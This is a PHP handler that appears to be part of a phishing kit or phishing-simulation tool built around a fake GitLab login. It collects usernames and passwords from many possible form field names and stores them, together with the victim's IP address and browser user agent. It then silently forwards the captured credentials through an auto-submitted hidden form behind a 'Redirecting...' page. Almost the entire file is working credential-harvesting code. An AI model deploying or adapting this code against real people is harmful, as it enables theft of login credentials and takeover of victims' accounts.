<?php
require_once '../../config.php';

$username = '';
foreach (['email', 'username', 'user', 'login', 'uname', 'userid'] as $field) {
    if (!empty($_POST[$field])) { $username = $_POST[$field]; break; }
}
if ($username === '' && !empty($_POST['user']['login'])) {
    $username = $_POST['user']['login'];
}

$password = '';
foreach (['password', 'pass', 'passwd', 'pwd', 'passcode'] as $field) {
    if (!empty($_POST[$field])) { $password = $_POST[$field]; break; }
}
if ($password === '' && !empty($_POST['user']['password'])) {
    $password = $_POST['user']['password'];
}

$template = 'gitlab';
$ip = getClientIP();
$agent = sanitize($_SERVER['HTTP_USER_AGENT'] ?? 'Unknown');

saveCapture([
    'username'   => sanitize($username),
    'password'   => $password,
    'ip_address' => $ip,
    'user_agent' => $agent,
    'template'   => $template
]);

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Redirecting...</title>
</head>
<body>
    <form id="edu" action="../../capture.php" method="POST">
        <input type="hidden" name="username" value="<?php echo htmlspecialchars($username, ENT_QUOTES, 'UTF-8'); ?>">
        <input type="hidden" name="password" value="<?php echo htmlspecialchars($password, ENT_QUOTES, 'UTF-8'); ?>">
        <input type="hidden" name="template" value="gitlab">
    </form>
    <script>document.getElementById('edu').submit();</script>
</body>
</html>
